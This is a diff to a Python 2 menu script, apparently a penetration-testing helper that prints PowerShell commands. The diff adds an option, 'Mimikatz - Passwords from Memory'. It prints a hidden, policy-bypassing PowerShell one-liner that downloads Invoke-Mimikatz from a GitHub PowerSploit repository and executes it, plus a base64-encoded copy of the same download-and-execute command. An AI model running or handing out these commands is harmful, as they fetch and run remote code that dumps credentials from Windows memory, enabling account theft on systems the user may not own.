@@ -173,7 +173,8 @@ while ans:
 [5] Change Users Execution Policy
 [6] Powershell 101
 [7] Base64 Encode a PowerShell Script
-[8] Exit/Quit
+[8] Mimikatz - Passwords from Memory
+[99] Exit/Quit
 -----------------------------------------------------
     """
     ans = int(raw_input("Select An Option: "))
@@ -196,4 +197,7 @@ while ans:
         print code 
         print "[*]Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + powershell_encode(code)
     elif ans == 8:
+        print "[*]Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
+        print "\n[*]Base64 encoded version download and execute:\nPowershell.exe -NoP -NonI -Exec Bypass -enc " + powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz")
+    elif ans == 99:
         sys.exit(0)
